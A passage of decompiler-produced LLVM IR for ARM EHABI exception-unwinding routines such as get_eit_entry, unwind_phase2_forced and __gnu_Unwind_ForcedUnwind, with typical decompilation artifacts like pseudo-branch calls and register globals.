  br i1 %v6_30adc, label %dec_label_pc_30aec, label %bb8

.thread3:                                         ; preds = %dec_label_pc_30ad8
  br label %dec_label_pc_30b14

bb8:                                              ; preds = %bb
  br label %dec_label_pc_30b14

dec_label_pc_30aec:                               ; preds = %bb
  %v3_30af0 = mul i32 %regno, 4
  %v1_30af4 = bitcast i8* %valuep to i32*
  %v2_30af4 = load i32, i32* %v1_30af4, align 4
  %v2_30af8 = add i32 %v3_30af0, %context
  %v2_30b00 = add i32 %v2_30af8, 4
  %v3_30b00 = inttoptr i32 %v2_30b00 to i32*
  store i32 %v2_30af4, i32* %v3_30b00, align 4
  ret i32 0

dec_label_pc_30b08:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_30b08
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_30b08, %bb9
  %v0_30b10 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_30b10)
  br label %dec_label_pc_30b14

dec_label_pc_30b14:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_30b14, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_30b1c = add i32 %context, 68
  %v2_30b1c = inttoptr i32 %v1_30b1c to i32*
  %v3_30b1c = load i32, i32* %v2_30b1c, align 4
  ret i32 %v3_30b1c

; uselistorder directives
  uselistorder i32 68, { 10, 1, 7, 2, 3, 4, 0, 5, 6, 9, 8 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_30b2c = add i32 %exc, 8
  %v2_30b2c = inttoptr i32 %v1_30b2c to i32*
  %v3_30b2c = load i32, i32* %v2_30b2c, align 4
  %v2_30b30 = icmp eq i32 %v3_30b2c, 0
  br i1 %v2_30b30, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_30b44 = xor i1 %v2_30b30, true
  call void @__pseudo_cond_branch(i1 %v2_30b44, i32 %v3_30b2c)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_30b5c = call i32 @abort()
  ret i32 %v0_30b5c
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_30b68 = call i32 @abort()
  ret i32 %v0_30b68
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_30b6c = load i32, i32* @r4, align 4
  store i32 %v3_30b6c, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32* %r5.global-to-local, align 4
  %v4_30b7c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 144) to i32*), align 4
  %v2_30b80 = icmp eq i32 %v4_30b7c, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_30b8c = add i32 %return_address, -2
  store i32 %v1_30b8c, i32* %r4.global-to-local, align 4
  br i1 %v2_30b80, label %dec_label_pc_30bc4, label %dec_label_pc_30b94

dec_label_pc_30b94:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_30b7c)
  %v2_30ba4 = icmp eq i32 %v1_30b8c, 0
  br i1 %v2_30ba4, label %.thread, label %dec_label_pc_30be4thread-pre-split

.thread:                                          ; preds = %dec_label_pc_30b94
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_30bac = load i32, i32* %r6.global-to-local, align 4
  %v3_30bac = add i32 %v2_30bac, 16
  %v4_30bac = inttoptr i32 %v3_30bac to i32*
  store i32 0, i32* %v4_30bac, align 4
  br label %dec_label_pc_30bb4

dec_label_pc_30bb4:                               ; preds = %.thread, %.thread10, %dec_label_pc_30d5c, %dec_label_pc_30d48, %dec_label_pc_30d24, %dec_label_pc_30cfc, %dec_label_pc_30bfc
  %v0_30bb4 = load i32, i32* %r2.global-to-local, align 4
  %v2_30bbc = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_30bbc, i32* @r4, align 4
  ret i32 %v0_30bb4

dec_label_pc_30bc4:                               ; preds = %entry
  store i32 24, i32* %r2.global-to-local, align 4
  %v4_30bcc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 24) to i32*), align 4
  %v4_30bd0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 56) to i32*), align 4
  store i32 %v4_30bd0, i32* %r2.global-to-local, align 4
  %v2_30bd4 = sub i32 %v4_30bcc, %v4_30bd0
  %v3_30bd8 = sdiv i32 %v2_30bd4, 8
  store i32 %v3_30bd8, i32* %stack_var_-36, align 4
  br label %dec_label_pc_30be4

dec_label_pc_30be4thread-pre-split:               ; preds = %dec_label_pc_30b94
  %v3_30be4.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_30be4

dec_label_pc_30be4:                               ; preds = %dec_label_pc_30be4thread-pre-split, %dec_label_pc_30bc4
  %v0_30c28.pre = phi i32 [ %v1_30b8c, %dec_label_pc_30be4thread-pre-split ], [ %v4_30bd0, %dec_label_pc_30bc4 ]
  %v1_30bec = phi i32 [ %v3_30be4.pr, %dec_label_pc_30be4thread-pre-split ], [ %v3_30bd8, %dec_label_pc_30bc4 ]
  %v2_30be8 = icmp eq i32 %v1_30bec, 0
  br i1 %v2_30be8, label %dec_label_pc_30bfc, label %dec_label_pc_30c18.preheader

dec_label_pc_30c18.preheader:                     ; preds = %dec_label_pc_30be4
  %v2_30bec = add i32 %v1_30bec, -1
  %v1_30c48 = add i32 %v0_30c28.pre, 8
  br label %dec_label_pc_30c18.outer

dec_label_pc_30bfc.loopexit:                      ; preds = %dec_label_pc_30c74
  br label %dec_label_pc_30bfc

dec_label_pc_30bfc:                               ; preds = %dec_label_pc_30bfc.loopexit, %dec_label_pc_30be4, %dec_label_pc_30d40
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_30c04 = load i32, i32* %r6.global-to-local, align 4
  %v2_30c04 = add i32 %v1_30c04, 16
  %v3_30c04 = inttoptr i32 %v2_30c04 to i32*
  store i32 0, i32* %v3_30c04, align 4
  br label %dec_label_pc_30bb4

dec_label_pc_30c0c:                               ; preds = %dec_label_pc_30c68
  %v3_30c0c = icmp ult i32 %storemerge40, %v0_30c6c
  br i1 %v3_30c0c, label %dec_label_pc_30c14, label %dec_label_pc_30c84

dec_label_pc_30c14:                               ; preds = %dec_label_pc_30c0c
  %v1_30c14 = add nsw i32 %v3_30c20, 1
  br label %dec_label_pc_30c18.outer

dec_label_pc_30c18.outer:                         ; preds = %dec_label_pc_30c14, %dec_label_pc_30c18.preheader
  %v1_30c74.ph = phi i32 [ %v1_30c14, %dec_label_pc_30c14 ], [ 0, %dec_label_pc_30c18.preheader ]
  %v0_30c18.ph = phi i32 [ %v0_30c18, %dec_label_pc_30c14 ], [ %v2_30bec, %dec_label_pc_30c18.preheader ]
  br label %dec_label_pc_30c18

dec_label_pc_30c18:                               ; preds = %dec_label_pc_30c18.outer, %dec_label_pc_30c7c
  %v0_30c18 = phi i32 [ %v1_30c7c, %dec_label_pc_30c7c ], [ %v0_30c18.ph, %dec_label_pc_30c18.outer ]
  %v2_30c18 = add i32 %v0_30c18, %v1_30c74.ph
  %tmp = icmp slt i32 %v2_30c18, 0
  %v4_30c1c = zext i1 %tmp to i32
  %v5_30c1c = add i32 %v4_30c1c, %v2_30c18
  %v3_30c20 = sdiv i32 %v5_30c1c, 2
  %v3_30c24 = mul i32 %v3_30c20, 8
  store i32 %v3_30c24, i32* @ip, align 4
  %v2_30c28 = add i32 %v3_30c24, %v0_30c28.pre
  %v3_30c28 = inttoptr i32 %v2_30c28 to i32*
  %v4_30c28 = load i32, i32* %v3_30c28, align 4
  %v1_30c2c = and i32 %v4_30c28, 1073741824
  %v2_30c2c = icmp eq i32 %v1_30c2c, 0
  %v2_30c30 = or i32 %v4_30c28, -2147483648
  %tmp79 = bitcast i32 %v4_30c28 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_30c34 = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_30c2c, i32 %v2_30c34, i32 %v2_30c30
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_30c38 = icmp eq i32 %v2_30bec, %v3_30c20
  store i32 %v2_30c28, i32* %r7.global-to-local, align 4
  br i1 %v9_30c38, label %dec_label_pc_30c68, label %dec_label_pc_30c48

dec_label_pc_30c48:                               ; preds = %dec_label_pc_30c18
  %v2_30c4c = add i32 %v3_30c24, %v1_30c48
  %v3_30c4c = inttoptr i32 %v2_30c4c to i32*
  %v4_30c4c = load i32, i32* %v3_30c4c, align 4
  %v1_30c54 = and i32 %v4_30c4c, 1073741824
  %v2_30c54 = icmp eq i32 %v1_30c54, 0
  %v2_30c58 = or i32 %v4_30c4c, -2147483648
  %tmp81 = bitcast i32 %v4_30c4c to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_30c5c = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_30c54, i32 %v2_30c5c, i32 %v2_30c58
  %v1_30c60 = add i32 %v2_30c4c, -1
  %v2_30c64 = add i32 %storemerge39, %v1_30c60
  br label %dec_label_pc_30c68

dec_label_pc_30c68:                               ; preds = %dec_label_pc_30c18, %dec_label_pc_30c48
  %storemerge40 = phi i32 [ %v2_30c64, %dec_label_pc_30c48 ], [ -1, %dec_label_pc_30c18 ]
  %v2_30c68 = add i32 %storemerge, %v2_30c28
  %v0_30c6c = load i32, i32* %r4.global-to-local, align 4
  %v3_30c6c = icmp ult i32 %v0_30c6c, %v2_30c68
  br i1 %v3_30c6c, label %dec_label_pc_30c74, label %dec_label_pc_30c0c

dec_label_pc_30c74:                               ; preds = %dec_label_pc_30c68
  %v9_30c74 = icmp eq i32 %v3_30c20, %v1_30c74.ph
  br i1 %v9_30c74, label %dec_label_pc_30bfc.loopexit, label %dec_label_pc_30c7c

dec_label_pc_30c7c:                               ; preds = %dec_label_pc_30c74
  %v1_30c7c = add nsw i32 %v3_30c20, -1
  br label %dec_label_pc_30c18

dec_label_pc_30c84:                               ; preds = %dec_label_pc_30c0c
  %v2_30c84 = load i32, i32* %v3_30c28, align 4
  %v1_30c88 = and i32 %v2_30c84, 1073741824
  %v2_30c88 = icmp eq i32 %v1_30c88, 0
  %v2_30c8c = or i32 %v2_30c84, -2147483648
  %tmp83 = bitcast i32 %v2_30c84 to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_30c90 = bitcast float %tmp84 to i32
  %v0_30c94 = select i1 %v2_30c88, i32 %v2_30c90, i32 %v2_30c8c
  %v2_30c94 = add i32 %v0_30c94, %v2_30c28
  %v1_30c98 = load i32, i32* %r6.global-to-local, align 4
  %v2_30c98 = add i32 %v1_30c98, 72
  %v3_30c98 = inttoptr i32 %v2_30c98 to i32*
  store i32 %v2_30c94, i32* %v3_30c98, align 4
  %v0_30c9c = load i32, i32* %r7.global-to-local, align 4
  %v1_30c9c = add i32 %v0_30c9c, 4
  %v2_30c9c = inttoptr i32 %v1_30c9c to i32*
  %v3_30c9c = load i32, i32* %v2_30c9c, align 4
  %v7_30ca0 = icmp eq i32 %v3_30c9c, 1
  br i1 %v7_30ca0, label %.thread10, label %dec_label_pc_30cb4

.thread10:                                        ; preds = %dec_label_pc_30c84
  %v1_30ca0 = add i32 %v3_30c9c, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_30cac = load i32, i32* %r6.global-to-local, align 4
  %v3_30cac = add i32 %v2_30cac, 16
  %v4_30cac = inttoptr i32 %v3_30cac to i32*
  store i32 %v1_30ca0, i32* %v4_30cac, align 4
  br label %dec_label_pc_30bb4

dec_label_pc_30cb4:                               ; preds = %dec_label_pc_30c84
  %v1_30cb4 = icmp slt i32 %v3_30c9c, 0
  br i1 %v1_30cb4, label %.thread38, label %dec_label_pc_30ccc

.thread38:                                        ; preds = %dec_label_pc_30cb4
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_30cc0 = load i32, i32* %r6.global-to-local, align 4
  %v5_30cc0 = add i32 %v4_30cc0, 76
  %v6_30cc0 = inttoptr i32 %v5_30cc0 to i32*
  store i32 %v1_30c9c, i32* %v6_30cc0, align 4
  %v3_30cc4 = load i32, i32* %r2.global-to-local, align 4
  %v4_30cc4 = load i32, i32* %r6.global-to-local, align 4
  %v5_30cc4 = add i32 %v4_30cc4, 80
  %v6_30cc4 = inttoptr i32 %v5_30cc4 to i32*
  store i32 %v3_30cc4, i32* %v6_30cc4, align 4
  br label %dec_label_pc_30cec

dec_label_pc_30ccc:                               ; preds = %dec_label_pc_30cb4
  %v1_30ccc = and i32 %v3_30c9c, 1073741824
  %v2_30ccc = icmp eq i32 %v1_30ccc, 0
  %v2_30cd0 = or i32 %v3_30c9c, -2147483648
  %tmp85 = bitcast i32 %v3_30c9c to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_30cd4 = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_30ccc, i32 %v2_30cd4, i32 %v2_30cd0
  %v1_30cd8 = add i32 %storemerge42, 4
  %v2_30cdc = add i32 %v1_30cd8, %v0_30c9c
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_30ce4 = load i32, i32* %r6.global-to-local, align 4
  %v2_30ce4 = add i32 %v1_30ce4, 76
  %v3_30ce4 = inttoptr i32 %v2_30ce4 to i32*
  store i32 %v2_30cdc, i32* %v3_30ce4, align 4
  %v0_30ce8 = load i32, i32* %r2.global-to-local, align 4
  %v1_30ce8 = load i32, i32* %r6.global-to-local, align 4
  %v2_30ce8 = add i32 %v1_30ce8, 80
  %v3_30ce8 = inttoptr i32 %v2_30ce8 to i32*
  store i32 %v0_30ce8, i32* %v3_30ce8, align 4
  br label %dec_label_pc_30cec

dec_label_pc_30cec:                               ; preds = %.thread38, %dec_label_pc_30ccc
  %v0_30cec = load i32, i32* %r6.global-to-local, align 4
  %v1_30cec = add i32 %v0_30cec, 76
  %v2_30cec = inttoptr i32 %v1_30cec to i32*
  %v3_30cec = load i32, i32* %v2_30cec, align 4
  store i32 %v3_30cec, i32* %r2.global-to-local, align 4
  %v1_30cf0 = inttoptr i32 %v3_30cec to i32*
  %v2_30cf0 = load i32, i32* %v1_30cf0, align 4
  %v1_30cf4 = icmp slt i32 %v2_30cf0, 0
  br i1 %v1_30cf4, label %dec_label_pc_30d18, label %dec_label_pc_30cfc

dec_label_pc_30cfc:                               ; preds = %dec_label_pc_30cec
  %v1_30cfc = and i32 %v2_30cf0, 1073741824
  %v2_30cfc = icmp eq i32 %v1_30cfc, 0
  %v2_30d00 = or i32 %v2_30cf0, -2147483648
  %tmp87 = bitcast i32 %v2_30cf0 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_30d04 = bitcast float %tmp88 to i32
  %v0_30d08 = select i1 %v2_30cfc, i32 %v2_30d04, i32 %v2_30d00
  %v2_30d08 = add i32 %v0_30d08, %v3_30cec
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_30d10 = add i32 %v0_30cec, 16
  %v3_30d10 = inttoptr i32 %v2_30d10 to i32*
  store i32 %v2_30d08, i32* %v3_30d10, align 4
  br label %dec_label_pc_30bb4

dec_label_pc_30d18:                               ; preds = %dec_label_pc_30cec
  %v3_30d18 = udiv i32 %v2_30cf0, 16777216
  %v1_30d1c = urem i32 %v3_30d18, 16
  %v2_30d1c = icmp eq i32 %v1_30d1c, 0
  br i1 %v2_30d1c, label %dec_label_pc_30d24, label %dec_label_pc_30d38

dec_label_pc_30d24:                               ; preds = %dec_label_pc_30d18
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_30d2c = load i32, i32* %r5.global-to-local, align 4
  %v2_30d2c = add i32 %v0_30d2c, -70040
  %v2_30d30 = add i32 %v0_30cec, 16
  %v3_30d30 = inttoptr i32 %v2_30d30 to i32*
  store i32 %v2_30d2c, i32* %v3_30d30, align 4
  br label %dec_label_pc_30bb4

dec_label_pc_30d38:                               ; preds = %dec_label_pc_30d18
  %v7_30d38 = icmp eq i32 %v1_30d1c, 1
  br i1 %v7_30d38, label %dec_label_pc_30d5c, label %dec_label_pc_30d40

dec_label_pc_30d40:                               ; preds = %dec_label_pc_30d38
  %v7_30d40 = icmp eq i32 %v1_30d1c, 2
  br i1 %v7_30d40, label %dec_label_pc_30d48, label %dec_label_pc_30bfc

dec_label_pc_30d48:                               ; preds = %dec_label_pc_30d40
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_30d50 = load i32, i32* %r5.global-to-local, align 4
  %v2_30d50 = add i32 %v0_30d50, -70056
  %v2_30d54 = add i32 %v0_30cec, 16
  %v3_30d54 = inttoptr i32 %v2_30d54 to i32*
  store i32 %v2_30d50, i32* %v3_30d54, align 4
  br label %dec_label_pc_30bb4

dec_label_pc_30d5c:                               ; preds = %dec_label_pc_30d38
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_30d64 = load i32, i32* %r5.global-to-local, align 4
  %v2_30d64 = add i32 %v0_30d64, -70048
  %v2_30d68 = add i32 %v0_30cec, 16
  %v3_30d68 = inttoptr i32 %v2_30d68 to i32*
  store i32 %v2_30d64, i32* %v3_30d68, align 4
  br label %dec_label_pc_30bb4

; uselistorder directives
  uselistorder i32 %v1_30d1c, { 2, 1, 0 }
  uselistorder i32 %v0_30cec, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_30c9c, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_30c6c, { 1, 0 }
  uselistorder i32 %v3_30c24, { 2, 1, 0 }
  uselistorder i32 %v3_30c20, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_30c18, { 1, 0 }
  uselistorder i32 %v0_30c18, { 1, 0 }
  uselistorder i32 %v2_30bec, { 1, 0 }
  uselistorder i32 %v0_30c28.pre, { 1, 0 }
  uselistorder i32 %v3_30bd8, { 1, 0 }
  uselistorder i32 %v1_30b8c, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder label %dec_label_pc_30cec, { 1, 0 }
  uselistorder label %dec_label_pc_30c68, { 1, 0 }
  uselistorder label %dec_label_pc_30c18, { 1, 0 }
  uselistorder label %dec_label_pc_30bfc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_30bb4, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_30d74(i32 %arg1) local_unnamed_addr {
dec_label_pc_30d74:
  %v0_30d74 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_30d74, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_30d74
  %v3_30d74 = mul i32 %arg1, %arg1
  %v2_30d78 = load i32, i32* @r8, align 4
  %v8_30d78 = shl i32 %v2_30d78, %v3_30d74
  %v9_30d78 = and i32 %v8_30d78, %v3_30d74
  %v8_30d7c = lshr i32 %v2_30d78, %v9_30d78
  %v9_30d7c = and i32 %v8_30d7c, %v9_30d78
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_30d74, %bb
  %v10_30d7c = phi i32 [ %arg1, %dec_label_pc_30d74 ], [ %v9_30d7c, %bb ]
  ret i32 %v10_30d7c

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_30d90 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_30da4 = inttoptr i32 %v1_30d90 to i32*
  %v2_30da4 = load i32, i32* %v1_30da4, align 4
  store i32 %v2_30da4, i32* %r0.global-to-local, align 4
  %v12_30da4 = add i32 %entry_vrs, 20
  %v1_30db0 = inttoptr i32 %v12_30da4 to i32*
  %v2_30db0 = load i32, i32* %v1_30db0, align 4
  store i32 %v2_30db0, i32* %r0.global-to-local, align 4
  %v12_30db0 = add i32 %entry_vrs, 36
  %v1_30db8 = inttoptr i32 %v12_30db0 to i32*
  %v2_30db8 = load i32, i32* %v1_30db8, align 4
  store i32 %v2_30db8, i32* %r0.global-to-local, align 4
  %v12_30db8 = add i32 %entry_vrs, 52
  store i32 %v12_30db8, i32* @ip, align 4
  %v13_30dbc = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_30dbc, i32* @lr, align 4
  %v1_30dc0 = inttoptr i32 %v12_30db8 to i32*
  %v2_30dc0 = load i32, i32* %v1_30dc0, align 4
  store i32 %v2_30dc0, i32* %r0.global-to-local, align 4
  %v9_30dc0 = add i32 %entry_vrs, 64
  %v10_30dc0 = inttoptr i32 %v9_30dc0 to i32*
  %v11_30dc0 = load i32, i32* %v10_30dc0, align 4
  store i32 0, i32* @r4, align 4
  %v1_30dc8 = add i32 %ucbp, 12
  %v2_30dc8 = inttoptr i32 %v1_30dc8 to i32*
  %v3_30dc8 = load i32, i32* %v2_30dc8, align 4
  store i32 %v2_30dc0, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_30de0 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_30dc0)
  store i32 %v2_30de0, i32* %r0.global-to-local, align 4
  %v0_30de4 = load i32, i32* @r6, align 4
  %v1_30de4 = load i32, i32* @r4, align 4
  %v9_30de4 = icmp eq i32 %v0_30de4, %v1_30de4
  store i32 %v2_30de0, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_30de4, label %dec_label_pc_30df8, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_30e04

dec_label_pc_30df8:                               ; preds = %entry
  store i32 %v0_30de4, i32* @r4, align 4
  br label %dec_label_pc_30e00

dec_label_pc_30e00:                               ; preds = %dec_label_pc_30ec8, %dec_label_pc_30df8
  br label %dec_label_pc_30e04

dec_label_pc_30e04:                               ; preds = %.thread, %dec_label_pc_30e00
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_30e00 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_30e04 = icmp eq i32 %v2_30de0, 0
  br i1 %v2_30e04, label %dec_label_pc_30e7c, label %.thread2.dec_label_pc_30e18_crit_edge

.thread2.dec_label_pc_30e18_crit_edge:            ; preds = %dec_label_pc_30e04
  br label %dec_label_pc_30e18

dec_label_pc_30e18:                               ; preds = %.thread2.dec_label_pc_30e18_crit_edge, %dec_label_pc_30e7c
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_30e28 = load i32, i32* @r5, align 4
  store i32 %v0_30e28, i32* @r3, align 4
  store i32 200248, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_30dc8)
  br i1 false, label %dec_label_pc_30e40, label %dec_label_pc_30e68

dec_label_pc_30e40:                               ; preds = %dec_label_pc_30e18
  br i1 undef, label %dec_label_pc_30e48, label %dec_label_pc_30e6c

dec_label_pc_30e48:                               ; preds = %dec_label_pc_30e40
  br i1 undef, label %dec_label_pc_30ec8, label %dec_label_pc_30e60

dec_label_pc_30e60:                               ; preds = %dec_label_pc_30e48
  br i1 undef, label %dec_label_pc_30ec0, label %dec_label_pc_30e68

dec_label_pc_30e68:                               ; preds = %dec_label_pc_30e18, %dec_label_pc_30e60
  br label %dec_label_pc_30e6c

dec_label_pc_30e6c:                               ; preds = %dec_label_pc_30e40, %dec_label_pc_30e68
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_30e7c:                               ; preds = %dec_label_pc_30e04
  store i32 %v11_30dc0, i32* @r3, align 4
  %v2_30e80 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_30e80, i32* @r4, align 4
  %v1_30e84 = load i32, i32* @r5, align 4
  %v2_30e84 = add i32 %v1_30e84, 20
  %v3_30e84 = inttoptr i32 %v2_30e84 to i32*
  store i32 %v11_30dc0, i32* %v3_30e84, align 4
  store i32 %v2_30e80, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_30e94 = call i32 @memcpy()
  %v0_30e9c = load i32, i32* @r6, align 4
  store i32 %v0_30e9c, i32* %r0.global-to-local, align 4
  %v0_30ea0 = load i32, i32* @r5, align 4
  %v1_30ea4 = add i32 %v0_30ea0, 16
  %v2_30ea4 = inttoptr i32 %v1_30ea4 to i32*
  %v3_30ea4 = load i32, i32* %v2_30ea4, align 4
  store i32 %v3_30ea4, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_30ea4)
  %v0_30eb4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_30eb4, i32* @r4, align 4
  br label %dec_label_pc_30e18

dec_label_pc_30ec0:                               ; preds = %dec_label_pc_30e60
  br label %dec_label_pc_30ec8

dec_label_pc_30ec8:                               ; preds = %dec_label_pc_30e48, %dec_label_pc_30ec0
  br label %dec_label_pc_30e00

; uselistorder directives
  uselistorder i32 %v11_30dc0, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 20, 19, 18, 14, 13, 12, 11, 10, 9, 26, 1, 17, 16, 8, 15, 7, 6, 0, 5, 4, 3, 25, 24, 23, 22, 21 }
  uselistorder i32* @r3, { 122, 123, 44, 45, 18, 19, 46, 47, 9, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 89, 3, 88, 7, 62, 21, 23, 24, 20, 124, 125, 61, 90, 91, 92, 131, 132, 4, 133, 134, 135, 5, 136, 137, 138, 6, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 0, 157, 158, 159, 160, 93, 94, 95, 96, 97, 98, 100, 101, 102, 70, 71, 72, 73, 74, 75, 76, 103, 104, 105, 106, 22, 161, 162, 171, 172, 173, 165, 166, 167, 168, 169, 1, 170, 8, 119, 120, 163, 164, 59, 60, 116, 117, 118, 111, 112, 63, 107, 108, 126, 127, 128, 129, 130, 11, 12, 13, 177, 174, 175, 176, 2, 178, 179, 180, 109, 110, 99, 25, 26, 34, 35, 36, 64, 65, 66, 67, 68, 69, 27, 28, 29, 30, 31, 32, 33, 37, 14, 15, 16, 17, 38, 39, 40, 41, 42, 43, 10, 113, 114, 115, 121 }
  uselistorder i32 10, { 1, 4, 39, 41, 42, 13, 45, 48, 49, 50, 32, 33, 15, 14, 5, 52, 51, 16, 53, 17, 54, 18, 55, 56, 2, 46, 47, 57, 19, 58, 20, 21, 22, 40, 9, 34, 64, 0, 43, 44, 23, 62, 59, 60, 24, 61, 26, 25, 35, 36, 8, 12, 11, 7, 10, 3, 37, 38, 27, 6, 29, 30, 28, 31, 63 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_30ec8, { 1, 0 }
  uselistorder label %dec_label_pc_30e6c, { 1, 0 }
  uselistorder label %dec_label_pc_30e68, { 1, 0 }
  uselistorder label %dec_label_pc_30e18, { 1, 0 }
  uselistorder label %dec_label_pc_30e04, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_30edc = add i32 %ucbp, 12
  %v3_30edc = inttoptr i32 %v2_30edc to i32*
  store i32 %stop_fn, i32* %v3_30edc, align 4
  %v3_30ee0 = add i32 %ucbp, 24
  %v4_30ee0 = inttoptr i32 %v3_30ee0 to i32*
  store i32 %tmp, i32* %v4_30ee0, align 4
  %v1_30ee4 = add i32 %entry_vrs, 60
  %v2_30ee4 = inttoptr i32 %v1_30ee4 to i32*
  %v3_30ee4 = load i32, i32* %v2_30ee4, align 4
  %v2_30eec = add i32 %entry_vrs, 64
  %v3_30eec = inttoptr i32 %v2_30eec to i32*
  store i32 %v3_30ee4, i32* %v3_30eec, align 4
  %v3_30ef4 = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_30ef4

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_30f0c6 = add i32 %vrs, 64
  %v2_30f0c7 = inttoptr i32 %v1_30f0c6 to i32*
